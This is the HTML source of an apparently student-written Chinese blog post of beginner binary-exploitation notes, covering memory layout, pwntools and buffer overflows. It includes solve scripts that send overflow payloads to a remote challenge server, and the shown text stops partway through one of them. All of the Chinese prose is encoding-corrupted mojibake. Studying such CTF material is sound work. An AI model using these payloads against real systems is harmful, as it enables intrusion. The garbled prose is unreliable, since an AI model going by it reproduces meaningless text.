<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="å‰è¨€æš‘å‡åšçš„ç­†è¨˜ï¼Œæ•´ç†æ ¼å¼ä¸€ä¸‹ä¹‹å¾Œå°±ä¸Ÿä¸Šä¾†å•¦é‚„æœ‰å¾ˆå¤šè¦å­¸ï¼Œç¹¼çºŒåŠªåŠ›ğŸ‹ ç°¡ä»‹æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°æ”¾æ£„(?)æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°å…¥åœŸ(O)æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°å…¥ç„(X)   æ‰€éœ€è¦æœƒçš„å·¥å…·&amp;çŸ¥è­˜python pwn, Ghidra&#x2F;IDA, radare2(r2), gdbâ€¦â€¦åæ­£å°±revçš„æ±è¥¿å¤§æ¦‚è¦æœƒowobç¨‹å¼æ¶æ§‹ã€linuxæŒ‡ä»¤   Program Structureç”±ä½è€Œé«˜    Te">
<meta property="og:type" content="article">
<meta property="og:title" content="PwnåŸºç¤ç­†è¨˜">
<meta property="og:url" content="http://wha13.github.io/2023/10/12/pwn-note/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="å‰è¨€æš‘å‡åšçš„ç­†è¨˜ï¼Œæ•´ç†æ ¼å¼ä¸€ä¸‹ä¹‹å¾Œå°±ä¸Ÿä¸Šä¾†å•¦é‚„æœ‰å¾ˆå¤šè¦å­¸ï¼Œç¹¼çºŒåŠªåŠ›ğŸ‹ ç°¡ä»‹æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°æ”¾æ£„(?)æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°å…¥åœŸ(O)æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°å…¥ç„(X)   æ‰€éœ€è¦æœƒçš„å·¥å…·&amp;çŸ¥è­˜python pwn, Ghidra&#x2F;IDA, radare2(r2), gdbâ€¦â€¦åæ­£å°±revçš„æ±è¥¿å¤§æ¦‚è¦æœƒowobç¨‹å¼æ¶æ§‹ã€linuxæŒ‡ä»¤   Program Structureç”±ä½è€Œé«˜    Te">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/H1brxcr63.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyVaPDOp3.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJvGXcBa3.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SydoBqr6n.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SkiPO5STh.png">
<meta property="og:image" content="https://hackmd.io/_uploads/B1NSjcHan.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rkKy8orp3.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SybrPsSTn.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Hk2KDoSah.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyaIuir6n.png">
<meta property="og:image" content="https://hackmd.io/_uploads/By-PijSa2.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1sh2sH6n.png">
<meta property="article:published_time" content="2023-10-12T14:04:00.000Z">
<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="BOF">
<meta property="article:tag" content="ROP">
<meta property="article:tag" content="ret2shellcode">
<meta property="article:tag" content="ret2code">
<meta property="article:tag" content="ret2lib">
<meta property="article:tag" content="GOT Hijacking">
<meta property="article:tag" content="format string">
<meta property="article:tag" content="Chinese">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/H1brxcr63.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>PwnåŸºç¤ç­†è¨˜</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/10/14/sunshinectf/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/09/27/cybertea/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/12/pwn-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/12/pwn-note/&text=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/12/pwn-note/&is_video=false&description=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PwnåŸºç¤ç­†è¨˜&body=Check out this article: http://wha13.github.io/2023/10/12/pwn-note/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/12/pwn-note/&title=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/12/pwn-note/&name=PwnåŸºç¤ç­†è¨˜&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/12/pwn-note/&t=PwnåŸºç¤ç­†è¨˜"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B0%A1%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">ç°¡ä»‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E8%A6%81%E6%9C%83%E7%9A%84%E5%B7%A5%E5%85%B7-%E7%9F%A5%E8%AD%98"><span class="toc-number">3.</span> <span class="toc-text">æ‰€éœ€è¦æœƒçš„å·¥å…·&amp;çŸ¥è­˜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Program-Structure"><span class="toc-number">4.</span> <span class="toc-text">Program Structure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Pwntools"><span class="toc-number">5.</span> <span class="toc-text">Python Pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E5%80%91"><span class="toc-number">5.1.</span> <span class="toc-text">æŒ‡ä»¤å€‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B"><span class="toc-number">5.2.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">6.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">6.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-1"><span class="toc-number">6.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2code"><span class="toc-number">7.</span> <span class="toc-text">BOF Ret2code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-1"><span class="toc-number">7.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">7.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-2"><span class="toc-number">7.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2ShellCode"><span class="toc-number">8.</span> <span class="toc-text">BOF Ret2ShellCode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-2"><span class="toc-number">8.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">8.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-3"><span class="toc-number">8.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF-Ret2Lib"><span class="toc-number">9.</span> <span class="toc-text">BOF Ret2Lib</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-3"><span class="toc-number">9.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">9.2.</span> <span class="toc-text">åŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lazy-Binding-%E6%A9%9F%E5%88%B6"><span class="toc-number">9.2.1.</span> <span class="toc-text">Lazy Binding æ©Ÿåˆ¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Libc-Base"><span class="toc-number">9.2.2.</span> <span class="toc-text">Libc Base</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95"><span class="toc-number">9.2.3.</span> <span class="toc-text">æ‰‹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-4"><span class="toc-number">9.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOT-Hijacking"><span class="toc-number">10.</span> <span class="toc-text">GOT Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-4"><span class="toc-number">10.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">10.2.</span> <span class="toc-text">åŸç†</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-Oriented-Programming"><span class="toc-number">11.</span> <span class="toc-text">Return Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-5"><span class="toc-number">11.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">11.2.</span> <span class="toc-text">åŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP-Gadget"><span class="toc-number">11.2.1.</span> <span class="toc-text">ROP Gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95-1"><span class="toc-number">11.2.2.</span> <span class="toc-text">æ‰‹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B-5"><span class="toc-number">11.3.</span> <span class="toc-text">ç¯„ä¾‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-Attack"><span class="toc-number">12.</span> <span class="toc-text">Format String Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A2%9D%E4%BB%B6-6"><span class="toc-number">12.1.</span> <span class="toc-text">åˆ©ç”¨æ¢ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">12.2.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B1"><span class="toc-number">12.3.</span> <span class="toc-text">ç¯„ä¾‹1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AF%84%E4%BE%8B2"><span class="toc-number">12.4.</span> <span class="toc-text">ç¯„ä¾‹2</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        PwnåŸºç¤ç­†è¨˜
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-10-12T14:04:00.000Z" class="dt-published" itemprop="datePublished">2023-10-12</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/BOF/" rel="tag">BOF</a>, <a class="p-category" href="/tags/Chinese/" rel="tag">Chinese</a>, <a class="p-category" href="/tags/GOT-Hijacking/" rel="tag">GOT Hijacking</a>, <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>, <a class="p-category" href="/tags/format-string/" rel="tag">format string</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/ret2code/" rel="tag">ret2code</a>, <a class="p-category" href="/tags/ret2lib/" rel="tag">ret2lib</a>, <a class="p-category" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æš‘å‡åšçš„ç­†è¨˜ï¼Œæ•´ç†æ ¼å¼ä¸€ä¸‹ä¹‹å¾Œå°±ä¸Ÿä¸Šä¾†å•¦<br>é‚„æœ‰å¾ˆå¤šè¦å­¸ï¼Œç¹¼çºŒåŠªåŠ›ğŸ‹</p>
<h2 id="ç°¡ä»‹"><a href="#ç°¡ä»‹" class="headerlink" title="ç°¡ä»‹"></a>ç°¡ä»‹</h2><p>æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°æ”¾æ£„(?)<br>æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°å…¥åœŸ(O)<br><del>æ¼æ´æ”»æ“Šå¾å…¥é–€åˆ°å…¥ç„(X)</del>  </p>
<h2 id="æ‰€éœ€è¦æœƒçš„å·¥å…·-çŸ¥è­˜"><a href="#æ‰€éœ€è¦æœƒçš„å·¥å…·-çŸ¥è­˜" class="headerlink" title="æ‰€éœ€è¦æœƒçš„å·¥å…·&amp;çŸ¥è­˜"></a>æ‰€éœ€è¦æœƒçš„å·¥å…·&amp;çŸ¥è­˜</h2><p>python pwn, Ghidra&#x2F;IDA, radare2(r2), gdbâ€¦â€¦åæ­£å°±revçš„æ±è¥¿å¤§æ¦‚è¦æœƒowob<br>ç¨‹å¼æ¶æ§‹ã€linuxæŒ‡ä»¤  </p>
<h2 id="Program-Structure"><a href="#Program-Structure" class="headerlink" title="Program Structure"></a>Program Structure</h2><p>ç”±ä½è€Œé«˜  </p>
<ul>
<li>Textï¼šç¨‹å¼ç¢¼çš„éƒ¨åˆ†ã€‚å¯è®€ï¼Œä¸å¯å¯«ï¼Œå¯åŸ·è¡Œ(r-x)  </li>
<li>Dataï¼šå·²åˆå§‹åŒ–çš„å…¨åŸŸè®Šæ•¸(for exam, å­—ä¸²ï¼Œæ•¸å­—ç­‰ç­‰çš„)  </li>
<li>BSSï¼šæœªåˆå§‹åŒ–çš„å…¨åŸŸè®Šæ•¸  </li>
<li>Heapï¼šç”±ä½ä½å¾€é«˜ä½ç–Šçš„å‹•æ…‹è¨˜æ†¶é«”ç©ºé–“  </li>
<li>Stackï¼šå­˜æ”¾æš«æ™‚è³‡æ–™(return adress, å€åŸŸè®Šæ•¸, åƒæ•¸, å›å‚³å€¼)ï¼Œç”±é«˜ä½å¾€ä½ä½æ‹‰é•·ï¼Œæœ€ä½ä½(é•·åˆ°åº•çš„åœ°æ–¹)æœƒæœ‰rspã€‚<br>Stackä¹Ÿæ˜¯ç›®å‰æˆ‘æ‰€çŸ¥é“çš„æ”»æ“Šæ‰‹æ³•ä¸­æœ€å®¹æ˜“è¢«æ‰“çš„å°è±¡ï¼Œç”±æ–¼è³‡æ–™æ˜¯ä¾åºå †ç–Šçš„ï¼Œå°è‡´å¯èƒ½è¢«å¡«å…¥å¤§é‡çš„è³‡æ–™å»è¦†è“‹æ‰åœ¨ä»–ä¸Šé¢å †ç–Šçš„ç›¸é—œè³‡æ–™(è®Šæ•¸æˆ–å…¶ä»–è³‡æ–™å‡ºç¾é †åºä¹Ÿå¾ˆé‡è¦ã€‚</li>
</ul>
<h2 id="Python-Pwntools"><a href="#Python-Pwntools" class="headerlink" title="Python Pwntools"></a>Python Pwntools</h2><p>è¦æ³¨æ„python3è¦decode, encode, bä¹‹é¡ã„‰â€¦â€¦.<br>python2æ‰æ˜¯pwntoolsä½¿ç”¨çš„æœ€ä½³åœ°é»(O)  </p>
<h3 id="æŒ‡ä»¤å€‘"><a href="#æŒ‡ä»¤å€‘" class="headerlink" title="æŒ‡ä»¤å€‘"></a>æŒ‡ä»¤å€‘</h3><ul>
<li>é€£ç·š  <ul>
<li>æŸå€‹ip, port <code>r=remote($ip, $port)</code>  </li>
<li>æŸå€‹shellæª”æ¡ˆ<code>r=process($path)</code></li>
</ul>
</li>
<li>è®€å–è³‡æ–™<ul>
<li>è®€åˆ°æŸå€‹å­—ä¸²çµæŸ<code>recvuntil(&#39;å­—ä¸²&#39;)</code>  </li>
<li>è®€åˆ°æŸå€‹å¤§å°çµæŸ<code>recv(å­—ç¯€å¤§å°)</code>  </li>
<li>è®€å–ä¸€è¡Œï¼Œkeependsç‚ºæ˜¯å¦è®€å–å…¥â€™\nâ€™<code>recvline(keepends=True)</code>  </li>
<li>ç›´åˆ°æ–‡ä»¶çµæŸ<code>recvcall()</code></li>
</ul>
</li>
<li>é€å‡ºè³‡æ–™<ul>
<li>é€å‡ºä¸¦æ›è¡Œ<code>sendline(&#39;string&#39;)</code>  </li>
<li>é€å‡ºä¸æ›è¡Œ<code>send(&#39;string&#39;)</code>  </li>
<li>è®Šæˆ32, 64ä½å…ƒè³‡æ–™(ç”¨åœ¨æ•´æ•¸)<code>p32(int), p64(int)</code></li>
</ul>
</li>
</ul>
<h3 id="ç¯„ä¾‹"><a href="#ç¯„ä¾‹" class="headerlink" title="ç¯„ä¾‹"></a>ç¯„ä¾‹</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼šç¬¬ä¸€é—œæ˜¯è¦è¼¸å…¥ä¸€å€‹å¯†ç¢¼ï¼Œåªæœƒreadå‰å››å€‹byteï¼Œå¯ä»¥ç”¨Ghidraé€†å‘å‡ºä¾†valueå¾Œæ‰“pwntools p32() è½‰æ›ä¸¦é€å‡ºã€‚ç¬¬äºŒé—œæ˜¯è¦å›ç­”ä¸€åƒå€‹æ•¸å­¸é¡Œï¼Œç›´æ¥<code>eval()</code>ä¸¦ç”¨python pwntoolsé€å‡ºå³å¯  </li>
<li>solve script:  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2116</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwntools&#x27;)</span></span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&#x27;</span>+s.decode())</span><br><span class="line">r.sendline(p32(<span class="number">0x79487ff</span>))</span><br><span class="line"><span class="built_in">print</span>(p64(<span class="number">0x79487ff</span>))</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    question = r.recvuntil(<span class="string">&#x27;?&#x27;</span>)[:-<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">eval</span>(question)</span><br><span class="line">    <span class="built_in">print</span>(question)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(question)))</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">str</span>(<span class="built_in">eval</span>(question))))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;meow\n&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
åœ–ï¼š<br><img src="https://hackmd.io/_uploads/H1brxcr63.png"></li>
</ul>
<h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><h3 id="åˆ©ç”¨æ¢ä»¶"><a href="#åˆ©ç”¨æ¢ä»¶" class="headerlink" title="åˆ©ç”¨æ¢ä»¶"></a>åˆ©ç”¨æ¢ä»¶</h3><ul>
<li>æ²’æœ‰Stack Canary  </li>
<li>æ¡ç”¨getè®€å–charé™£åˆ—ï¼Œå°è‡´Overflowæˆç«‹</li>
</ul>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åˆ©ç”¨å°æŸå€‹bufferåœ¨stackä¸Šé¢overflowåˆ°stackä»¥ä¸Šçš„å…¶ä»–è³‡æ–™é€²è€Œä¿®æ”¹ä¹‹ã€‚ï¼ˆradare2å¯ä»¥åˆ†ææ¯å€‹stackä¸Šé¢è³‡æ–™byteå¤§å°ï¼Œç¢ºèªè¦overflowåˆ°å“ªå€‹åœ°æ–¹ã€‚ï¼‰<br>Stack Canaryæœƒæ ¹æ“šcanaryå€¼æ˜¯å¦è¢«æ”¹å‹•åšä¸€æ¬¡overflowç¢ºèªï¼Œæ‰€ä»¥å¿…é ˆè¢«é—œé–‰æˆ–è€…å¯ä»¥åœ¨overflowæ™‚ä¸å‹•åˆ°canaryçš„value(æˆ–è€…èƒ½overwrite canary)  </p>
<ul>
<li>Example<br>ä¸‹åœ–æ˜¯æŸå€‹è¢«BOFçš„ç›®æ¨™ç”±Radareå°å‡ºçš„çµæœï¼Œå¯ä»¥çœ‹åˆ°åœ¨Stackæœ€é«˜ä½çš„è®Šæ•¸è·é›¢æœ€åº•éƒ¨ç‚º <code>0x20</code>bytes(å› ç‚ºå®ƒæ˜¯<code>var_20h</code>) ï¼Œæ‰€ä»¥å®ƒå¦‚æœæƒ³è¦æŠŠ<code>var_1ch</code>è¦†è“‹æ‰ï¼Œpayloadç‚º<code>&#39;A&#39;*(0x20-0x1c)+p32(ä½ è¦ä¿®æ”¹çš„å€¼)</code><br><img src="https://hackmd.io/_uploads/HyVaPDOp3.png"></li>
</ul>
<h3 id="ç¯„ä¾‹-1"><a href="#ç¯„ä¾‹-1" class="headerlink" title="ç¯„ä¾‹"></a>ç¯„ä¾‹</h3><ul>
<li>é¡Œç›®å¤§æ„ï¼šè¼¸å…¥å­—ä¸²å¾Œåˆ†æˆå…©é—œï¼Œç¬¬ä¸€é—œæ˜¯è¦å°‡æŸå…©å€‹intè®ŠæˆæŒ‡å®šçš„valueï¼Œç¬¬äºŒé—œæ˜¯è¦çŒœä¸­æŸå€‹random value</li>
<li>è§£æ³•ï¼šåˆ©ç”¨BOFä¿®æ”¹å…©å€‹int valueä»¥åŠrandomçš„å€¼è®“ä»–ä¸å†random</li>
<li>solve script:<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payloads=<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(<span class="number">0xfaceb00c</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xaaaaaaaa</span>)</span><br><span class="line">r=remote(<span class="string">&#x27;120.114.62.213&#x27;</span>, <span class="number">2111</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./luck&#x27;)</span></span><br><span class="line">s=r.recvuntil(<span 